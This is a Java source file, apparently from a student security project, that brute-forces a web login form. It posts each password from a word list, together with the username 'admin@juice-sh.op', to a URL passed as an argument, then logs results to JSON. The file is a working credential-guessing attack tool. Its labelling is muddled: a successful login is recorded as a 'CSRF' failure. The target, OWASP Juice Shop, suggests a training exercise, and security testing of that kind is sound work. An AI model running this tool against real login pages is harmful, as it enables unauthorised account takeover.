package fr.isep.projetseculogiciel;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Paths;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.FileWriter;
import java.io.IOException;

public class BruteForceController {
    private static JsonArray securityFailures = new JsonArray();
    private static boolean isVulnerable = false;
    private static String message = "";

    public static void main(String[] args) throws IOException {
        String url = args[0];
        String username = "admin@juice-sh.op";
        String errorMessage = "Invalid credentials";
        Result result = crack(url, username, errorMessage, readPasswordsFromFile("src/main/resources/fr/isep/projetseculogiciel/Passwords.txt"));

        // Access the results
        System.out.println("Is Vulnerable: " + result.isVulnerable);
        System.out.println("Message: " + result.message);

        writeJsonToFile(securityFailures, "security_failures.json");
    }

    private static class Result {
        boolean isVulnerable;
        String message;

        Result(boolean isVulnerable, String message) {
            this.isVulnerable = isVulnerable;
            this.message = message;
        }
    }

    private static Result crack(String url, String username, String error_message, BufferedReader passwords) {
        int count = 0;
        String line;

        try {
            while ((line = passwords.readLine()) != null) {
                line = line.trim();
                count++;

                String data = "email=" + username + "&password=" + line + "&Log%20In=submit";
                byte[] postData = data.getBytes();

                HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream()) {
                    os.write(postData);
                }

                StringBuilder response = new StringBuilder();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    String inputLine;
                    while ((inputLine = br.readLine()) != null) {
                        response.append(inputLine);
                    }
                }

                if (response.toString().contains(error_message)) {
                    isVulnerable = true;
                    // Continue the loop
                    continue;
                } else if (response.toString().contains("CSRF") || response.toString().contains("csrf")) {
                    isVulnerable = false;
                    message = "BruteForce not working on this website. CSRF Token Detected.";
                    return new Result(isVulnerable, message);
                } else {
                    JsonObject failure = new JsonObject();
                    failure.addProperty("security_failure_type", "CSRF");
                    failure.addProperty("security_failure_location", url);
                    failure.addProperty("security_failure_severity", "High"); // Example severity

                    securityFailures.add(failure);


                }
            }

            message = "User password not in the list of passwords";
        } catch (Exception e) {
            e.printStackTrace();
            isVulnerable = true;
            message = "Error";
        }

        return new Result(isVulnerable, message);
    }

    private static void writeJsonToFile(JsonArray data, String filename) {
        try (FileWriter file = new FileWriter(filename)) {
            file.write(data.toString()); // Indentation for readability
            System.out.println("Successfully written to " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public static BufferedReader readPasswordsFromFile(String filePath) throws IOException {
        FileReader fileReader = new FileReader(filePath);
        return new BufferedReader(fileReader);
    }


}